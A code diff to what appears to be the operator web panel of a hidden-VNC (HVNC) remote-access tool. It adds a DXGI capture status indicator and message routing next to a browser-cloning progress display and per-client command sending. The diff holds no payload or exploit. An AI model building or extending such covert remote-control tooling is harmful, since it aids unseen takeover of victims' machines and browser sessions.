@@ -346,6 +346,38 @@ import { checkFeatureAccess } from "./feature-gate.js";
     cloneProgressLabel.textContent = `Cloning ${browser} — ${copiedMB} / ${totalMB} MB`;
   }
 
+  const dxgiStatusEl = document.getElementById("dxgiStatus");
+  const dxgiStatusIcon = document.getElementById("dxgiStatusIcon");
+  const dxgiStatusLabel = document.getElementById("dxgiStatusLabel");
+  let dxgiHideTimer = null;
+
+  function handleDXGIStatus(msg) {
+    if (!dxgiStatusEl) return;
+    if (dxgiHideTimer) {
+      clearTimeout(dxgiHideTimer);
+      dxgiHideTimer = null;
+    }
+    dxgiStatusEl.classList.remove("hidden");
+    dxgiStatusEl.classList.add("flex");
+    if (msg.success) {
+      dxgiStatusIcon.className = "fa-solid fa-microchip text-emerald-400";
+      dxgiStatusLabel.textContent = msg.message || "DXGI active";
+      dxgiStatusLabel.className = "text-emerald-300";
+      dxgiHideTimer = setTimeout(() => {
+        dxgiStatusEl.classList.add("hidden");
+        dxgiStatusEl.classList.remove("flex");
+      }, 8000);
+    } else {
+      dxgiStatusIcon.className = "fa-solid fa-microchip text-rose-400";
+      dxgiStatusLabel.textContent = msg.message || "DXGI failed";
+      dxgiStatusLabel.className = "text-rose-300";
+      dxgiHideTimer = setTimeout(() => {
+        dxgiStatusEl.classList.add("hidden");
+        dxgiStatusEl.classList.remove("flex");
+      }, 10000);
+    }
+  }
+
   function sendCmd(type, payload) {
     if (!activeClientId) {
       console.warn("No active client selected");
@@ -721,6 +753,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
         handleLookupResult(msg);
         return;
       }
+      if (msg && msg.type === "hvnc_dxgi_status") {
+        handleDXGIStatus(msg);
+        return;
+      }
       if (msg && msg.type === "hvnc_error") {
         console.error("hvnc: server error:", msg.error || msg.message);
         return;
@@ -746,6 +782,10 @@ import { checkFeatureAccess } from "./feature-gate.js";
     }
     if (msg && msg.type === "hvnc_lookup_result") {
       handleLookupResult(msg);
+      return;
+    }
+    if (msg && msg.type === "hvnc_dxgi_status") {
+      handleDXGIStatus(msg);
       return;
     }
     if (msg && msg.type === "hvnc_error") {
